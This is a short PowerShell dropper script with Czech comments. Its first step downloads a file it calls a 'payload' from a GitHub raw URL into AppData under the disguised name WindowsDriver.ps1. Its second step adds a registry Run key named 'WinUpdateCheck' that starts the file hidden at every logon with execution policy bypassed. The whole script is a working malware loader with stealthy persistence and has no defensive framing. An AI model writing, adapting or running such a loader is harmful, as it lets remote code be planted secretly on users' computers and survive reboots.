# 1. Stáhni payload
$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1" 
$localPath = "$env:APPDATA\WindowsDriver.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath

# 2. Nastav persistenci (např. pomocí Scheduled Task)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdateCheck" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
